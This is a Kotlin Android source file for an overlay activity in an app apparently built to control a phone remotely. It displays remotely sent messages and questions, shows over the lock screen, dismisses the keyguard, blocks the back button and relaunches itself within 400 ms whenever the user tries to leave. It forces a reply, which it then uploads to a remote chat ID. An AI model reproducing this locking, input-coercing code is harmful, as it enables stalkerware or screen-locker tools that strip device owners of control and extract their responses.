package com.phonecontrol

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.*
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.text.InputType
import android.util.TypedValue
import android.view.*
import android.view.animation.DecelerateInterpolator
import android.widget.*
import kotlinx.coroutines.*

/**
 * Универсальный оверлей:
 *  - mode = "plain"   → текст + кнопка ОК  (без блокировки)
 *  - mode = "reply"   → текст + поле ввода + Отправить  (блокировка как в Video)
 *  - mode = "survey"  → вопросы по очереди + поле ввода  (блокировка как в Video)
 *
 * Блокировка (reply/survey): при уходе из активити (HOME, недавние) —
 * перезапуск через 400мс с сохранением прогресса, пока пользователь не отправит ответ.
 */
class OverlayActivity : Activity() {

    // ── UI ────────────────────────────────────────────────────────────────────
    private lateinit var cardView: LinearLayout
    private lateinit var titleView: TextView
    private lateinit var subtitleView: TextView
    private lateinit var inputLayout: LinearLayout
    private lateinit var inputField: EditText
    private lateinit var actionBtn: Button
    private lateinit var progressView: TextView

    // ── Состояние ─────────────────────────────────────────────────────────────
    private var mode            = "plain"
    private var replyPrompt     = "✏️ Напиши ответ:"
    private var questions       = arrayListOf<String>()
    private var answers         = arrayListOf<String>()
    private var currentQuestion = 0
    private var originalText    = ""
    private var uploadChatId    = ""
    private var done            = false   // true после успешной отправки

    private val handler = Handler(Looper.getMainLooper())

    companion object {
        /**
         * Запустить оверлей.
         * [answersProgress] и [currentQ] используются при перезапуске для восстановления прогресса.
         */
        fun start(
            context: Context,
            message: String,
            fbMode: String = "plain",
            replyPrompt: String = "✏️ Напиши ответ:",
            survey: List<String> = emptyList(),
            chatId: String = "",
            answersProgress: ArrayList<String> = arrayListOf(),
            currentQ: Int = 0,
        ) {
            context.startActivity(Intent(context, OverlayActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK
                putExtra("message", message)
                putExtra("fb_mode", fbMode)
                putExtra("reply_prompt", replyPrompt)
                putStringArrayListExtra("survey", ArrayList(survey))
                putExtra("chat_id", chatId)
                putStringArrayListExtra("answers_progress", answersProgress)
                putExtra("current_q", currentQ)
            })
        }
    }

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.setFlags(WindowManager.LayoutParams.FLAG_SECURE,
            WindowManager.LayoutParams.FLAG_SECURE)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true); setTurnScreenOn(true)
        }
        window.addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
        )

        buildUI()
        applyIntent(intent)
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        intent?.let { applyIntent(it) }
    }

    override fun onStop() {
        super.onStop()
        val locked = (mode == "reply" || mode == "survey") && !done
        if (locked) {
            // Перезапускаем с текущим прогрессом через 400мс
            handler.postDelayed({
                if (!done) {
                    start(
                        applicationContext,
                        originalText,
                        mode,
                        replyPrompt,
                        questions,
                        uploadChatId,
                        answers,
                        currentQuestion,
                    )
                }
            }, 400L)
        } else {
            finishAndRemoveTask()
        }
    }

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    override fun onBackPressed() {
        // Блокируем кнопку назад в режимах с обратной связью
        if (mode == "plain" || done) finishAndRemoveTask()
    }

    // ── Intent → State ────────────────────────────────────────────────────────

    private fun applyIntent(i: Intent) {
        originalText     = i.getStringExtra("message") ?: "⚠️ Сообщение"
        mode             = i.getStringExtra("fb_mode") ?: "plain"
        replyPrompt      = i.getStringExtra("reply_prompt") ?: "✏️ Напиши ответ:"
        questions        = i.getStringArrayListExtra("survey") ?: arrayListOf()
        uploadChatId     = i.getStringExtra("chat_id") ?: ""
        answers          = i.getStringArrayListExtra("answers_progress") ?: arrayListOf()
        currentQuestion  = i.getIntExtra("current_q", 0)
        done             = false
        applyMode()
    }

    private fun applyMode() {
        titleView.text = originalText

        when (mode) {
            "plain" -> {
                subtitleView.visibility = View.GONE
                inputLayout.visibility  = View.GONE
                progressView.visibility = View.GONE
                actionBtn.text = "ОК"
                actionBtn.setOnClickListener { finishAndRemoveTask() }
            }
            "reply" -> {
                subtitleView.text       = replyPrompt
                subtitleView.visibility = View.VISIBLE
                inputLayout.visibility  = View.VISIBLE
                progressView.visibility = View.GONE
                inputField.hint = "Введи ответ..."
                actionBtn.text  = "Отправить"
                actionBtn.setOnClickListener { submitReply() }
            }
            "survey" -> {
                if (questions.isEmpty()) { finishAndRemoveTask(); return }
                inputLayout.visibility = View.VISIBLE
                showQuestion(currentQuestion)
            }
        }
    }

    // ── Survey ────────────────────────────────────────────────────────────────

    private fun showQuestion(idx: Int) {
        if (idx >= questions.size) {
            submitSurvey()
            return
        }
        currentQuestion         = idx
        subtitleView.text       = questions[idx]
        subtitleView.visibility = View.VISIBLE
        inputField.setText("")
        inputField.hint = "Введи ответ..."

        val isLast = idx == questions.size - 1
        actionBtn.text = if (isLast) "Готово ✓" else "Далее →"
        progressView.text       = "${idx + 1} / ${questions.size}"
        progressView.visibility = View.VISIBLE

        actionBtn.setOnClickListener {
            val ans = inputField.text.toString().trim()
            // Обновляем или добавляем ответ
            if (idx < answers.size) answers[idx] = ans else answers.add(ans)
            showQuestion(idx + 1)
        }
    }

    // ── Submit ────────────────────────────────────────────────────────────────

    private fun submitReply() {
        val answer = inputField.text.toString().trim()
        done = true
        CoroutineScope(Dispatchers.IO).launch {
            Uploader.sendText(this@OverlayActivity, "💬 Ответ: $answer", uploadChatId)
        }
        showDone("✅ Ответ отправлен!")
    }

    private fun submitSurvey() {
        done = true
        val sb = StringBuilder("📋 *Ответы на опросник:*\n\n")
        questions.forEachIndexed { i, q ->
            sb.append("*${i + 1}. $q*\n")
            sb.append("${answers.getOrElse(i) { "—" }}\n\n")
        }
        CoroutineScope(Dispatchers.IO).launch {
            Uploader.sendText(this@OverlayActivity, sb.toString(), uploadChatId)
        }
        showDone("✅ Ответы отправлены!")
    }

    private fun showDone(msg: String) {
        titleView.text          = msg
        subtitleView.visibility = View.GONE
        inputLayout.visibility  = View.GONE
        progressView.visibility = View.GONE
        actionBtn.text          = "ОК"
        actionBtn.setOnClickListener { finishAndRemoveTask() }
    }

    // ── UI Builder ────────────────────────────────────────────────────────────

    private fun buildUI() {
        val root = android.widget.FrameLayout(this).apply {
            background = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(0xCC000000.toInt(), 0xEE0A0A1A.toInt())
            )
        }

        cardView = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity     = android.view.Gravity.CENTER_HORIZONTAL
            background  = cardBackground()
            elevation   = dp(16f)
            setPadding(dp(28), dp(32), dp(28), dp(28))
        }

        titleView = TextView(this).apply {
            textSize      = 26f
            setTextColor(Color.WHITE)
            gravity       = android.view.Gravity.CENTER
            typeface      = Typeface.DEFAULT_BOLD
            letterSpacing = 0.02f
            setPadding(0, 0, 0, dp(8))
        }

        subtitleView = TextView(this).apply {
            textSize    = 15f
            setTextColor(0xFFCCCCCC.toInt())
            gravity     = android.view.Gravity.CENTER
            setPadding(0, 0, 0, dp(16))
            visibility  = View.GONE
        }

        progressView = TextView(this).apply {
            textSize    = 13f
            setTextColor(0xFF8888AA.toInt())
            gravity     = android.view.Gravity.CENTER
            setPadding(0, 0, 0, dp(8))
            visibility  = View.GONE
        }

        inputLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            visibility  = View.GONE
            setPadding(0, 0, 0, dp(16))
        }
        inputField = EditText(this).apply {
            inputType   = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_FLAG_MULTI_LINE
            minLines    = 2
            maxLines    = 5
            setTextColor(Color.WHITE)
            setHintTextColor(0xFF666688.toInt())
            background  = inputBackground()
            setPadding(dp(14), dp(12), dp(14), dp(12))
            textSize    = 15f
        }
        inputLayout.addView(inputField, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT))

        actionBtn = Button(this).apply {
            textSize      = 16f
            setTextColor(Color.WHITE)
            background    = buttonBackground()
            setPadding(dp(24), dp(14), dp(24), dp(14))
            isAllCaps     = false
            letterSpacing = 0.04f
            typeface      = Typeface.DEFAULT_BOLD
            stateListAnimator = null
        }

        val divider = View(this).apply {
            setBackgroundColor(0x33FFFFFF)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 1).also { it.bottomMargin = dp(20) }
        }

        fun lp() = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT).also { it.bottomMargin = 0 }

        cardView.addView(titleView,    lp())
        cardView.addView(subtitleView, lp())
        cardView.addView(progressView, lp())
        cardView.addView(divider)
        cardView.addView(inputLayout,  lp())
        cardView.addView(actionBtn,    lp())

        val cardParams = android.widget.FrameLayout.LayoutParams(
            (resources.displayMetrics.widthPixels * 0.88).toInt(),
            android.widget.FrameLayout.LayoutParams.WRAP_CONTENT
        ).also { it.gravity = android.view.Gravity.CENTER }

        root.addView(cardView, cardParams)
        setContentView(root)

        // Анимация появления
        cardView.alpha        = 0f
        cardView.translationY = dp(40).toFloat()
        cardView.animate()
            .alpha(1f).translationY(0f)
            .setDuration(350)
            .setInterpolator(DecelerateInterpolator(2f))
            .start()
    }

    private fun cardBackground() = GradientDrawable(
        GradientDrawable.Orientation.TL_BR,
        intArrayOf(0xFF1A1A2E.toInt(), 0xFF16213E.toInt(), 0xFF0F3460.toInt())
    ).apply {
        cornerRadius = dp(20).toFloat()
        setStroke(dp(1), 0x33FFFFFF)
    }

    private fun inputBackground() = GradientDrawable().apply {
        setColor(0xFF0D1117.toInt())
        cornerRadius = dp(12).toFloat()
        setStroke(dp(1), 0x446666AA)
    }

    private fun buttonBackground() = GradientDrawable(
        GradientDrawable.Orientation.LEFT_RIGHT,
        intArrayOf(0xFF4F46E5.toInt(), 0xFF7C3AED.toInt())
    ).apply { cornerRadius = dp(14).toFloat() }

    private fun dp(value: Float) =
        TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, value, resources.displayMetrics).toInt()
    private fun dp(value: Int) = dp(value.toFloat())
}
